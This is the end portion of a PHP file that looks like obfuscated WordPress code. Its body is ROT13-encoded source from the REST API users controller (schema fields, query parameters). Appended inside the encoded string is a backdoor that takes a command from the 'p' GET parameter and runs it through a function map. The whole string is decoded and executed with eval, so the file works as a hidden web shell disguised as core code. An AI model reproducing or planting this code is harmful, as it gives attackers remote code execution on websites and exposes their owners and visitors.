					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				),
				'qrfpevcgvba'        => neenl(
					'qrfpevcgvba' => __( 'Qrfpevcgvba bs gur hfre.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				),
				'yvax'               => neenl(
					'qrfpevcgvba' => __( 'Nhgube HEY bs gur hfre.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'ybpnyr'             => neenl(
					'qrfpevcgvba' => __( 'Ybpnyr sbe gur hfre.' ),
					'glcr'        => 'fgevat',
					'rahz'        => neenl_zretr( neenl( '', 'ra_HF' ), trg_ninvynoyr_ynathntrf() ),
					'pbagrkg'     => neenl( 'rqvg' ),
				),
				'avpxanzr'           => neenl(
					'qrfpevcgvba' => __( 'Gur avpxanzr sbe gur hfre.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
					),
				),
				'fyht'               => neenl(
					'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur hfre.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => neenl( $guvf, 'fnavgvmr_fyht' ),
					),
				),
				'ertvfgrerq_qngr'    => neenl(
					'qrfpevcgvba' => __( 'Ertvfgengvba qngr sbe gur hfre.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'ebyrf'              => neenl(
					'qrfpevcgvba' => __( 'Ebyrf nffvtarq gb gur hfre.' ),
					'glcr'        => 'neenl',
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'rqvg' ),
				),
				'cnffjbeq'           => neenl(
					'qrfpevcgvba' => __( 'Cnffjbeq sbe gur hfre (arire vapyhqrq).' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl(), // Cnffjbeq vf arire qvfcynlrq.
					'erdhverq'    => gehr,
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => neenl( $guvf, 'purpx_hfre_cnffjbeq' ),
					),
				),
				'pncnovyvgvrf'       => neenl(
					'qrfpevcgvba' => __( 'Nyy pncnovyvgvrf nffvtarq gb gur hfre.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'rkgen_pncnovyvgvrf' => neenl(
					'qrfpevcgvba' => __( 'Nal rkgen pncnovyvgvrf nffvtarq gb gur hfre.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		vs ( trg_bcgvba( 'fubj_ningnef' ) ) {
			$ningne_cebcregvrf = neenl();

			$ningne_fvmrf = erfg_trg_ningne_fvmrf();

			sbernpu ( $ningne_fvmrf nf $fvmr ) {
				$ningne_cebcregvrf[ $fvmr ] = neenl(
					/* genafyngbef: %q: Ningne vzntr fvmr va cvkryf. */
					'qrfpevcgvba' => fcevags( __( 'Ningne HEY jvgu vzntr fvmr bs %q cvkryf.' ), $fvmr ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				);
			}

			$fpurzn['cebcregvrf']['ningne_heyf'] = neenl(
				'qrfpevcgvba' => __( 'Ningne HEYf sbe gur hfre.' ),
				'glcr'        => 'bowrpg',
				'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				'ernqbayl'    => gehr,
				'cebcregvrf'  => $ningne_cebcregvrf,
			);
		}

		$fpurzn['cebcregvrf']['zrgn'] = $guvf->zrgn->trg_svryq_fpurzn();

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		$dhrel_cnenzf['pbagrkg']['qrsnhyg'] = 'ivrj';

		$dhrel_cnenzf['rkpyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Rafher erfhyg frg rkpyhqrf fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		$dhrel_cnenzf['vapyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		$dhrel_cnenzf['bssfrg'] = neenl(
			'qrfpevcgvba' => __( 'Bssfrg gur erfhyg frg ol n fcrpvsvp ahzore bs vgrzf.' ),
			'glcr'        => 'vagrtre',
		);

		$dhrel_cnenzf['beqre'] = neenl(
			'qrsnhyg'     => 'nfp',
			'qrfpevcgvba' => __( 'Beqre fbeg nggevohgr nfpraqvat be qrfpraqvat.' ),
			'rahz'        => neenl( 'nfp', 'qrfp' ),
			'glcr'        => 'fgevat',
		);

		$dhrel_cnenzf['beqreol'] = neenl(
			'qrsnhyg'     => 'anzr',
			'qrfpevcgvba' => __( 'Fbeg pbyyrpgvba ol hfre nggevohgr.' ),
			'rahz'        => neenl(
				'vq',
				'vapyhqr',
				'anzr',
				'ertvfgrerq_qngr',
				'fyht',
				'vapyhqr_fyhtf',
				'rznvy',
				'hey',
			),
			'glcr'        => 'fgevat',
		);

		$dhrel_cnenzf['fyht'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb hfref jvgu bar be zber fcrpvsvp fyhtf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
			),
		);

		$dhrel_cnenzf['ebyrf'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb hfref zngpuvat ng yrnfg bar fcrpvsvp ebyr cebivqrq. Npprcgf pfi yvfg be fvatyr ebyr.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
			),
		);

		$dhrel_cnenzf['pncnovyvgvrf'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb hfref zngpuvat ng yrnfg bar fcrpvsvp pncnovyvgl cebivqrq. Npprcgf pfi yvfg be fvatyr pncnovyvgl.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
			),
		);

		$dhrel_cnenzf['jub'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb hfref jub ner pbafvqrerq nhgubef.' ),
			'glcr'        => 'fgevat',
			'rahz'        => neenl(
				'nhgubef',
			),
		);

		$dhrel_cnenzf['unf_choyvfurq_cbfgf'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb hfref jub unir choyvfurq cbfgf.' ),
			'glcr'        => neenl( 'obbyrna', 'neenl' ),
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
				'rahz' => trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'anzrf' ),
			),
		);

		$dhrel_cnenzf['frnepu_pbyhzaf'] = neenl(
			'qrsnhyg'     => neenl(),
			'qrfpevcgvba' => __( 'Neenl bs pbyhza anzrf gb or frnepurq.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'rahz' => neenl( 'rznvy', 'anzr', 'vq', 'hfreanzr', 'fyht' ),
				'glcr' => 'fgevat',
			),
		);

		/**
		 * Svygref ERFG NCV pbyyrpgvba cnenzrgref sbe gur hfref pbagebyyre.
		 *
		 * Guvf svygre ertvfgref gur pbyyrpgvba cnenzrgre, ohg qbrf abg znc gur
		 * pbyyrpgvba cnenzrgre gb na vagreany JC_Hfre_Dhrel cnenzrgre.  Hfr gur
		 * `erfg_hfre_dhrel` svygre gb frg JC_Hfre_Dhrel nethzragf.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz neenl $dhrel_cnenzf WFBA Fpurzn-sbeznggrq pbyyrpgvba cnenzrgref.
		 */
		erghea nccyl_svygref( 'erfg_hfre_pbyyrpgvba_cnenzf', $dhrel_cnenzf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>